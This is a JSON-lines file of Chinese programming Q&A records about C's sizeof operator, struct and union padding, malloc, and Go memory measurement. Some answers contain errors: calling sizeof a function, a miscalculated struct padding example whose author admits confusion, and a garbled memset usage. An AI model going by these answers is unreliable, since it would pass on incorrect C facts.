{"Answer": "&lt;p&gt;结构体和共用体参考下这个&lt;br /&gt;&lt;a href=\"https://blog.csdn.net/RSH0522/article/details/115970723\" id=\"textarea_1650548419464_1650549754651_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;结构体和共用体_RSH0522的博客-CSDN博客_结构体和共用体&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;结构体引入&amp;#xff1a;在有些时候需要将不同类型的数据组成一个有机的整体&amp;#xff0c;如将学生的姓名&amp;#xff0c;学号&amp;#xff0c;年龄等组织在一起&amp;#xff0c;这时使用结构体是最方便的。1、结构体类型的声明&amp;#xff1a;struct   结构体名{成员列表     //成员也可以是结构体} &amp;#xff1b;             //注意这里一定要有分号2、结构体变量的定义&amp;#xff1a;1、先声明结构体类型&amp;#xff0c;再定义变量&amp;#xff1b;struct  结构体名{成员列表&amp;#xff1b;} &amp;#xff1b;结构体类型名  变量名列表&amp;#xff1b;如&amp;#xff1a;struct student{ char num[5]; char nam&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;img class=\"md_link_img\" id=\"md_link_img\" src=\"https://g.csdnimg.cn/static/logo/favicon32.ico\" /&gt;\n        &lt;span class=\"flex-1\"&gt;\n          &lt;span class=\"md_link_url\"&gt;https://blog.csdn.net/RSH0522/article/details/115970723&lt;/span&gt;\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;你题目的解答代码如下&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;s_stu&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; num[&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;];\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; name[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;];\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; age;\n};\n&lt;span class=\"hljs-keyword\"&gt;union&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;u_stu&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; num[&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;];\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; name[&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;];\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; age;\n};\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;s_stu&lt;/span&gt; a;\n    &lt;span class=\"hljs-keyword\"&gt;union&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;u_stu&lt;/span&gt; b;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a)); &lt;span class=\"hljs-comment\"&gt;//输出20  5&amp;#43;10&amp;#43;4&amp;#61;19,补齐4(最长类型int长度)的倍数到20&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(b)); &lt;span class=\"hljs-comment\"&gt;//输出12  5,10,4最大值&amp;#61;10,补齐4(最长类型int长度)的倍数到12&lt;/span&gt;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;blockquote&gt;\n&lt;p&gt;如有帮助&amp;#xff0c;请点击我的回答下方的&lt;strong&gt;【采纳该答案】&lt;/strong&gt;按钮帮忙采纳下&amp;#xff0c;谢谢!&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/101342676936187.png\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["#C语言#定义结构体s_ stu 和共用体u_ .stu,二者成员完全一样,都是学号、姓名、年龄,用sizeof 计算它们所占内存空间。", ["定义结构体s_ stu 和共用体u_ .stu,二者成员完全一样,都是学号、姓名、年龄,用sizeof 计算它们所占内存空间。", "修改成员类型或长度,重新运行程序,检测运行结果和你计算的理论值是否有差距。"]], "Tag": "程序设计"}
{"Answer": "没区别朋友，只是这段代码交叉使用Node和*CreateList。其实就是想用CreateList指向链表头，其余同Node创建对象。\r\n这样看起来比较难受，我个人喜欢统一表示，要用指针的地方，加上*。\r\n L = (CreateList)malloc(sizeof(Node));这句申请的是头节点\r\n p = (Node*)malloc(sizeof(Node));这句申请的是普通节点，可以复用这一句，可能不同点就是这一句何以复用吧。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["p = (Node*)malloc(sizeof(Node));和\tL = (CreateList)malloc(sizeof(Node));这个有什么区别？", ["#include<stdio.h>\n#include<malloc.h>\ntypedef struct Node\n{\n    int data;\n    struct Node *next;\n}Node, *CreateList;\nvoid InsertList(CreateList *L, int m)\n{\n    Node *t, *s;\n    s = *L;\n    while (m > s->next->data && s->next->next != NULL) s = s->next;\n    if (s->next->next == NULL)\n\n    {\n        t = (Node*)malloc(sizeof(Node));\n        t->data = m;\n        s->next->next = t;\n        s = t;\n        s->next = NULL;\n    }\n    else\n    {\n        t = (Node*)malloc(sizeof(Node));\n        t->data = m;\n        t->next = s->next;\n        s->next = t;\n    }\n}\nvoid Print(CreateList L)\n{\n    Node *p;\n    p = L->next;\n    while (p->next)\n    {\n        printf(\"%d \", p->data);\n        p = p->next;\n    }printf(\"%d\", p->data);\n}\nint main()\n{\n    CreateList L;\n    int i, a, m, n;\n    Node *last, *p;\n    L = (CreateList)malloc(sizeof(Node));\n    L->data = 0;\n    L->next = NULL;\n    last = L;\n    scanf(\"%d %d\", &n, &m);\n    for (i = 0; i < n; i++)\n    {\n        scanf(\"%d\", &a);\n        p = (Node*)malloc(sizeof(Node));\n        p->data = a;\n        p->next = NULL;\n        last->next = p;\n        last = p;\n    }\n    InsertList(&L, m);\n    Print(L);\n    return 0;\n}\n", "\n\n", "p = (Node*)malloc(sizeof(Node));和 L = (CreateList)malloc(sizeof(Node));这个有什么区别？", "\n刚刚学习数据结构，请问各位大佬这两个的区别在哪里"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;&lt;a href=\"https://golang.org/pkg/unsafe/#Sizeof\" rel=\"nofollow noreferrer\"&gt;&lt;code&gt;unsafe.SizeOf()&lt;/code&gt;&lt;/a&gt; and &lt;code&gt;reflect.Type.Size()&lt;/code&gt; only return the size of the passed value without recursively traversing the data structure and adding sizes of pointed values.&lt;/p&gt;\n\n&lt;p&gt;The slice is relatively a simple struct: &lt;a href=\"https://golang.org/pkg/reflect/#SliceHeader\" rel=\"nofollow noreferrer\"&gt;&lt;code&gt;reflect.SliceHeader&lt;/code&gt;&lt;/a&gt;, and since we know it references a backing array, we can easily compute its size \"manually\", e.g.:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;s := make([]int32, 1000)\n\nfmt.Println(\"Size of []int32:\", unsafe.Sizeof(s))\nfmt.Println(\"Size of [1000]int32:\", unsafe.Sizeof([1000]int32{}))\nfmt.Println(\"Real size of s:\", unsafe.Sizeof(s)+unsafe.Sizeof([1000]int32{}))\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output (try it on the &lt;a href=\"https://play.golang.org/p/r2ejk8JPx2\" rel=\"nofollow noreferrer\"&gt;Go Playground&lt;/a&gt;):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;Size of []int32: 12\nSize of [1000]int32: 4000\nReal size of s: 4012\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Maps are a lot more complex data structures, I won't go into details, but check out this question+answer: &lt;a href=\"https://stackoverflow.com/questions/31847549/golang-computing-the-memory-footprint-or-byte-length-of-a-map\"&gt;Golang: computing the memory footprint (or byte length) of a map&lt;/a&gt;&lt;/p&gt;\n\n&lt;h2&gt;Calculating size of any variable or structure (recursively)&lt;/h2&gt;\n\n&lt;p&gt;If you want \"real\" numbers, you may take advantage of the testing tool of Go, which can also perform memory benchmarking. Pass the &lt;code&gt;-benchmem&lt;/code&gt; argument, and inside the benchmark function allocate only whose memory you want to measure:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;func BenchmarkSlice100(b *testing.B) {\n    for i := 0; i &amp;lt; b.N; i++ { getSlice(100) }\n}\nfunc BenchmarkSlice1000(b *testing.B) {\n    for i := 0; i &amp;lt; b.N; i++ { getSlice(1000) }\n}\nfunc BenchmarkSlice10000(b *testing.B) {\n    for i := 0; i &amp;lt; b.N; i++ { getSlice(10000) }\n}\nfunc BenchmarkMap100(b *testing.B) {\n    for i := 0; i &amp;lt; b.N; i++ { getMap(100) }\n}\nfunc BenchmarkMap1000(b *testing.B) {\n    for i := 0; i &amp;lt; b.N; i++ { getMap(1000) }\n}\nfunc BenchmarkMap10000(b *testing.B) {\n    for i := 0; i &amp;lt; b.N; i++ { getMap(10000) }\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;(Remove the timing and printing calls from &lt;code&gt;getSlice()&lt;/code&gt; and &lt;code&gt;getMap()&lt;/code&gt; of course.)&lt;/p&gt;\n\n&lt;p&gt;Running with&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;go test -bench . -benchmem\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Output is:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;BenchmarkSlice100-4    3000000        471 ns/op        1792 B/op      1 allocs/op\nBenchmarkSlice1000-4    300000       3944 ns/op       16384 B/op      1 allocs/op\nBenchmarkSlice10000-4    50000      39293 ns/op      163840 B/op      1 allocs/op\nBenchmarkMap100-4       200000      11651 ns/op        2843 B/op      9 allocs/op\nBenchmarkMap1000-4       10000     111040 ns/op       41823 B/op     12 allocs/op\nBenchmarkMap10000-4       1000    1152011 ns/op      315450 B/op    135 allocs/op\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;&lt;code&gt;B/op&lt;/code&gt; values tell you how many bytes were allocated per op. &lt;code&gt;allocs/op&lt;/code&gt; tells how many (distinct) memory allocations occurred per op.&lt;/p&gt;\n\n&lt;p&gt;On my 64-bit architecture (where the size of &lt;code&gt;int&lt;/code&gt; is 8 bytes) it tells that the size of a slice having 2000 elements is roughly 16 KB (in line with 2000 * 8 bytes). A map with 1000 &lt;code&gt;int-int&lt;/code&gt; pairs required approximately to allocate 42 KB.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如何在Go中获取变量的内存大小？", ["\n\n", "I am curious about the memory cost of ", "map", " and ", "slice", ", so I wrote a program to compare the sizes. I get the memory size by ", "unsafe.Sizeof(s)", ", but obviously it is wrong, because when I change the size, the output is the same.", "\n\n", "func getSlice(size int) []int {\n    t := time.Now()\n    s := make([]int, size*2)\n    for i := 0; i < size; i++ {\n        index := i << 1\n        s[index] = i\n        s[index+1] = i\n    }\n    fmt.Println(\"slice time cost: \", time.Since(t))\n    return s\n}\n\nfunc getMap(size int) map[int]int {\n    t := time.Now()\n    m := make(map[int]int, size)\n    for i := 0; i < size; i++ {\n        m[i] = i\n    }\n    fmt.Println(\"map time cost: \", time.Since(t))\n    return m\n}\n\nfunc TestMem(t *testing.T) {\n    size := 1000\n    s := getSlice(size)\n    m := getMap(size)\n    fmt.Printf(\"slice size: %d\n\", unsafe.Sizeof(s))\n    fmt.Printf(\"map size: %d\n\", unsafe.Sizeof(m))\n}\n", "\n    "]], "Tag": "程序设计"}
{"Answer": "http://blog.sciencenet.cn/blog-2733016-1108521.html", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["安装netcdf-fortran出错 cannot compute sizeof (off_t)", ["安装netcdf-fortran出错，求助各位大佬"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;code class=\"language-javascript\"&gt;sizeof()&lt;/code&gt; 是C语言中一个&lt;strong&gt;用于计算数据类型所占字节数的函数&lt;/strong&gt;&amp;#xff0c;可以把其看做是一个运算符&amp;#xff0c;所以不加括号也不会报错。&lt;/p&gt;\n&lt;ol&gt;&lt;li&gt;&lt;code class=\"language-javascript\"&gt;sizeof(3&amp;#43;5.0)&lt;/code&gt; 这句是把 &lt;code class=\"language-javascript\"&gt;3&amp;#43;5.0&lt;/code&gt; 表达式的运算结果传递给 &lt;code class=\"language-javascript\"&gt;sizeof()&lt;/code&gt; 函数&amp;#xff0c;由于表达式中有浮点数&amp;#xff0c;表达式的运算结果为浮点数&amp;#xff0c;sizeof接受到的是浮点数&amp;#xff0c;所以 &lt;code class=\"language-javascript\"&gt;printf()&lt;/code&gt; 函数为 8 (注&amp;#xff1a;默认的浮点数类型为 double&amp;#xff0c;8 byte)。&lt;/li&gt;&lt;li&gt;&lt;code class=\"language-javascript\"&gt;sizeof 3&amp;#43;5.0&lt;/code&gt; 和 &lt;code class=\"language-javascript\"&gt;sizeof(3) &amp;#43; 5.0&lt;/code&gt; 的效果是一样的&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;sizeof()&lt;/code&gt; 先计算出 3 所占的字节数为 4&amp;#xff0c;接着再加上 5.0&amp;#xff0c;由于其为浮点数&amp;#xff0c;所以结果为 9.0&amp;#xff0c;又因为printf() 函数里面指定的格式为%d&amp;#xff0c;格式和数据类型不对应&amp;#xff0c;所以输出的结果就为 0&lt;/li&gt;&lt;/ol&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个sizeof（3+5.0）和sizeof 3+5.0意思分别是啥", ["\n", "这个sizeof（3+5.0）和sizeof 3+5.0意思分别是啥"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;对的呢&amp;#xff0c;就是这样子&lt;br /&gt;如果定义的是一个数组&amp;#xff0c;想求数组的长度也可以用sizeof&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-attribute\"&gt;int&lt;/span&gt; a[] &amp;#61; {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;}\n&lt;span class=\"hljs-attribute\"&gt;int&lt;/span&gt; len &amp;#61; sizeof(a) / sizeof(int);\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个写对了吗，用sizeof函数计算占用空间", []], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;一、sizeof的概念&lt;/p&gt;\n&lt;p&gt;Sizeof是C语言的一种单目操作符&amp;#xff0c;如C语言的其他操作符&amp;#43;&amp;#43;、--等。它并不是函数。Sizeof操作符以字节形式给出了其操作数的存储大小。操作数可以是一个表达式或括在括号内的类型名。操作数的存储大小由操作数的类型决定。&lt;/p&gt;\n&lt;p&gt;二、sizeof的使用方法&lt;/p&gt;\n&lt;p&gt;1、用于数据类型&lt;/p&gt;\n&lt;p&gt;sizeof使用形式&amp;#xff1a;sizeof(type)&lt;/p&gt;\n&lt;p&gt;数据类型必须括号括住&amp;#xff0c;如sizeof(int)。&lt;/p&gt;\n&lt;p&gt;2、用于变量&lt;/p&gt;\n&lt;p&gt;sizeof使用形式&amp;#xff1a;sizeof(var_name)或sizeof var_name&lt;/p&gt;\n&lt;p&gt;变量名可以不用括号括住。如sizeof(var_name)&amp;#xff0c;sizeof var_name等都是正确形式。带括号的用法更普遍&amp;#xff0c;大多数程序员采用这种形式。&lt;/p&gt;\n&lt;p&gt;注意&amp;#xff1a;sizeof操作符不能用于函数类型&amp;#xff0c;不完全类型或位字段。不完全类型指具有未知存储大小的数据类型&amp;#xff0c;如未知存储大小的数组类型、未知内容的结构或联合类型、void类型等。&lt;/p&gt;\n&lt;p&gt;如sizeof(max)&amp;#xff0c;变量max定义为int max()&amp;#xff1b;sizeof(char_v)&amp;#xff0c;cha_vr定义为char char_v[MAX]且MAX未知&amp;#xff1b;sizeof(void)等&amp;#xff0c;这些都不是正确形式。&lt;/p&gt;\n&lt;p&gt;三、sizeof的结果&lt;/p&gt;\n&lt;p&gt;Sizeof操作符的结果类型是size_t&amp;#xff0c;它在头文件中typedef为unsigned int类型。该类型保证能容纳实现所建立的最大对象的字节大小。&amp;#xff08;这里指在64位系统&amp;#xff09;&lt;/p&gt;\n&lt;p&gt;1、若操作数具有类型char、unsigned char或signed char&amp;#xff0c;其结果等于1。&lt;/p&gt;\n&lt;p&gt;ANSI C正式规定字符类型为1字节&amp;#xff0c;sizeof(char)&amp;#61;1。&lt;/p&gt;\n&lt;p&gt;2、int、unsigned int、short int、unsigned short、long int、unsigned long、float、double、long double类型的sizeof在ANSI C中没有具体规定&amp;#xff0c;大小依赖于现实&amp;#xff0c;这里用64位系统测试&amp;#xff0c;分别为&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;sizeof(int)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(unsigned int)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(short int)&amp;#61;2&lt;/p&gt;\n&lt;p&gt;sizeof(unsigned short)&amp;#61;2&lt;/p&gt;\n&lt;p&gt;sizeof(long int)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(unsigned long)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(float)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(double)&amp;#61;8&lt;/p&gt;\n&lt;p&gt;sizeof(long double)&amp;#61;8&lt;/p&gt;\n&lt;p&gt;3、当操作数是指针时&amp;#xff0c;sizeof依赖于编译器。例如Microsoft C/C&amp;#43;&amp;#43;7.0中&amp;#xff0c;near类指针字节数为2&amp;#xff0c;far、huge类指针字节数为4。一般Unix的指针字节数为4。&lt;/p&gt;\n&lt;p&gt;4、当操作数具有数组类型时&amp;#xff0c;其结果是数组的总字节数。&lt;/p&gt;\n&lt;p&gt;如&amp;#xff1a;int a[10]&amp;#xff0c;sizeof(a)&amp;#61;40。&lt;/p&gt;\n&lt;p&gt;5、联合类型操作数的sizeof是其最大字节成员的字节数。&lt;/p&gt;\n&lt;p&gt;如&amp;#xff1a;typedef union IP{&lt;!-- --&gt;&lt;/p&gt;\n&lt;p&gt;char a[1];&lt;/p&gt;\n&lt;p&gt;int net;&lt;/p&gt;\n&lt;p&gt;}ip;&lt;/p&gt;\n&lt;p&gt;sizeof(ip)&amp;#61;4。&lt;/p&gt;\n&lt;p&gt;6、结构类型操作数的sizeof是这种类型对象的总字节数&amp;#xff0c;包括任何铺垫在内。因为一个变量的地址一般会是这个变量本身所占字节数的倍数。&lt;/p&gt;\n&lt;p&gt;char 1的倍数&lt;/p&gt;\n&lt;p&gt;short 2的倍数&lt;/p&gt;\n&lt;p&gt;int 4的倍数&lt;/p&gt;\n&lt;p&gt;double 8的倍数&lt;/p&gt;\n&lt;p&gt;typedef struct Goods{&lt;!-- --&gt;&lt;/p&gt;\n&lt;p&gt;char name[18];//18&lt;/p&gt;\n&lt;p&gt;double price;/4的倍数&amp;#xff0c;从20开始&lt;/p&gt;\n&lt;p&gt;char special;//1的倍数&amp;#xff0c;从28开始&lt;/p&gt;\n&lt;p&gt;int num;//4的倍数&amp;#xff0c;从32开始&lt;/p&gt;\n&lt;p&gt;short saled;//2的倍数&amp;#xff0c;从36开始&lt;/p&gt;\n&lt;p&gt;}gs;&lt;/p&gt;\n&lt;p&gt;&lt;span style=\"display:inline-block;text-indent:2em;\"&gt;  name  | ....... |  price  |special|  |  |  | num | saled |  |  | name|  |  |&lt;/span&gt;&lt;/p&gt;\n&lt;p&gt;0       18   20      28    29     32   36    38.....新的变量&amp;#xff0c;4的倍数开始  &lt;/p&gt;\n&lt;p&gt;printf(“sizeof(gs)&amp;#61;%d\\n”,sizeof(gs)) &amp;#61;&amp;#61;&amp;gt; 38&amp;#xff0c;但是在系统中运行为48&amp;#xff0c;不理解耶&amp;#xff01;&amp;#xff01;&amp;#xff01;&amp;#xff01;&lt;/p&gt;\n&lt;p&gt;7、如果操作数是函数中的数组形参或函数类型的形参&amp;#xff0c;sizeof给出其只针对的大小。&lt;/p&gt;\n&lt;p&gt;void demo(char a){&lt;!-- --&gt;&lt;/p&gt;\n&lt;p&gt;printf(&amp;#34;sizeof(a)&amp;#61;%d\\n&amp;#34;,sizeof(a));&lt;/p&gt;\n&lt;p&gt;}&lt;/p&gt;\n&lt;p&gt;调用形式demo(‘a’)。&lt;/p&gt;\n&lt;p&gt;输出结果为&amp;#xff1a;sizeof(a)&amp;#61;4。&lt;/p&gt;\n&lt;p&gt;四、sizeof与其他操作符的关系&lt;/p&gt;\n&lt;p&gt;Sizeof的优先级为2级&amp;#xff0c;比/、%等3级运算符优先级高。它可以与其他操作符一起组成表达式。如i*sizeof(int)&amp;#xff0c;其中i为int类型变量。&lt;/p&gt;\n&lt;p&gt;五、sizeof的主要用途&lt;/p&gt;\n&lt;p&gt;1、sizeof操作符的一个主要用途是与存储分配和I/O系统那样的例程进行通信。例如&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;void *malloc(size_t size),&lt;/p&gt;\n&lt;p&gt;sizeof_t fread(void* ptr , size_t size , size_t nmemb , FILE* stream)。&lt;/p&gt;\n&lt;p&gt;2、sizeof的另一个的主要用途是计算数组中元素的个数&amp;#xff0c;例如&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;void* memset(void* s , int c , sizeof(s))。&lt;/p&gt;\n&lt;p&gt;六、建议&lt;/p&gt;\n&lt;p&gt;由于操作数的字节数在实现时可能出现变化&amp;#xff0c;建议在涉及到操作数字节大小时用sizeof来代替常量计算。&lt;/p&gt;\n&lt;p&gt;七、实例&lt;/p&gt;\n&lt;p&gt;一道笔试题&amp;#xff0c;请写出下面代码在32位平台上的运行结果&amp;#xff0c;并说明sizeof的性质&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/p&gt;\n&lt;p&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/p&gt;\n&lt;p&gt;int main(){&lt;!-- --&gt;&lt;/p&gt;\n&lt;p&gt;char a[30];&lt;/p&gt;\n&lt;p&gt;char &lt;em&gt;b &amp;#61; (char&lt;/em&gt;)malloc(20*sizeof(char));&lt;/p&gt;\n&lt;p&gt;printf(&amp;#34;sizeof(a)&amp;#61;%d\\n&amp;#34;,sizeof(a));&lt;/p&gt;\n&lt;p&gt;printf(&amp;#34;sizeof(b)&amp;#61;%d\\n&amp;#34;,sizeof(b));&lt;/p&gt;\n&lt;p&gt;printf(&amp;#34;sizeof(a[3])&amp;#61;%d\\n&amp;#34;,sizeof(a[3]));&lt;/p&gt;\n&lt;p&gt;printf(&amp;#34;sizeof(b&amp;#43;3)&amp;#61;%d\\n&amp;#34;,sizeof(b&amp;#43;3));&lt;/p&gt;\n&lt;p&gt;printf(&amp;#34;sizeof(&lt;em&gt;(b&amp;#43;4))&amp;#61;%d\\n&amp;#34;,sizeof(&lt;/em&gt;(b&amp;#43;4)));&lt;/p&gt;\n&lt;p&gt;return 0;&lt;/p&gt;\n&lt;p&gt;}&lt;/p&gt;\n&lt;p&gt;结果为&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;sizeof(a)&amp;#61;30&lt;/p&gt;\n&lt;p&gt;sizeof(b)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(a[3])&amp;#61;1&lt;/p&gt;\n&lt;p&gt;sizeof(b&amp;#43;3)&amp;#61;4&lt;/p&gt;\n&lt;p&gt;sizeof(*(b&amp;#43;4))&amp;#61;1&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["有人会做这个吗，c语言", ["请编程输出分别输出sizeof(long double)、sizeof(3.14L)、sizeof(314LL)在内存中占多少字节。 请使用运算符sizeof计算以上值。", "\n", "输出格式:", "每两个值之间有一个空格。不要输出多余的字符。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;联合体的大小取决于他所有成员中占用空间最大的一个成员的大小&amp;#xff0c;因此sizeof(test)为8&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["假设sizeof(int)为4，求sizeof(test)", ["问题遇到的现象和发生背景", "\n", "假设sizeof(int)为4，sizeof(char)为1，sizeof(double)为8，已知： union { int i; char c; double d; }test; 则sizeof(test)为", " (A)13;", " (B)8;", "(C)16;", " (D)4;", "\n", "问题相关代码，请勿粘贴截图", "\n", "运行结果及报错内容", "\n", "我的解答思路和尝试过的方法", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;This is because of padding added to satisfy alignment constraints. &lt;a href=\"http://en.wikipedia.org/wiki/Data_structure_alignment\" rel=\"noreferrer\"&gt;Data structure alignment&lt;/a&gt; impacts both performance and correctness of programs:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;Mis-aligned access might be a hard error (often &lt;code&gt;SIGBUS&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Mis-aligned access might be a soft error.\n\n&lt;ul&gt;\n&lt;li&gt;Either corrected in hardware, for a modest performance-degradation.&lt;/li&gt;\n&lt;li&gt;Or corrected by emulation in software, for a severe performance-degradation.&lt;/li&gt;\n&lt;li&gt;In addition, atomicity and other concurrency-guarantees might be broken, leading to subtle errors.&lt;/li&gt;\n&lt;/ul&gt;&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Here's an example using typical settings for an x86 processor (all used 32 and 64 bit modes):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;struct X\n{\n    short s; /* 2 bytes */\n             /* 2 padding bytes */\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 3 padding bytes */\n};\n\nstruct Y\n{\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n    short s; /* 2 bytes */\n};\n\nstruct Z\n{\n    int   i; /* 4 bytes */\n    short s; /* 2 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n};\n\nconst int sizeX = sizeof(struct X); /* = 12 */\nconst int sizeY = sizeof(struct Y); /* = 8 */\nconst int sizeZ = sizeof(struct Z); /* = 8 */\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;One can minimize the size of structures by sorting members by alignment (sorting by size suffices for that in basic types) (like structure &lt;code&gt;Z&lt;/code&gt; in the example above).&lt;/p&gt;\n\n&lt;p&gt;IMPORTANT NOTE: Both the C and C++ standards state that structure alignment is implementation-defined.  Therefore each compiler may choose to align data differently, resulting in different and incompatible data layouts.  For this reason, when dealing with libraries that will be used by different compilers, it is important to understand how the compilers align data.  Some compilers have command-line settings and/or special &lt;code&gt;#pragma&lt;/code&gt; statements to change the structure alignment settings.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么结构体的 sizeof 不等于每个成员 sizeof 的总和？", ["\n\n", "Why does the ", "sizeof", " operator return a size larger for a structure than the total sizes of the structure's members?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member"]], "Tag": "程序设计"}
{"Answer": "sizeof计算的是变量所占的内存的大小，在32位iede操作系统下面，所有的指针类型的大小又是4 ，int类型的数据大小为4 字节，懂了吧，只要是指针全是4 ，其他的数据类型看具体的情况，数组大小 为数组的类型大小*数组的长度", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言malloc后使用sizeof的问题", ["编译器visual studio", "\n如下代码：", "\n\n", "   int **ip;\n    ip = (int **)malloc( sizeof(int*) *2);\n    for(int i = 0;i < 2 ; ++i)\n    {\n        ip[i] = (int *)malloc(sizeof(int) * 3);\n    }\n    //测试sizeof（ip）/sizeof( int *)值为1，\n    //sizeof（p）值为4，\n    //测试sizeof（ip[0]）/sizeof( int)值也为1，\n", "\n\n", "在看如下代码：", "\n\n", "int ia[2][3];\n//测试sizeof（ia）/sizeof( int *)值为2，\n//sizeof（p）值为24，\n//\n//测试sizeof（ia[0]）/sizeof( int)值也为3，\n"]], "Tag": "程序设计"}
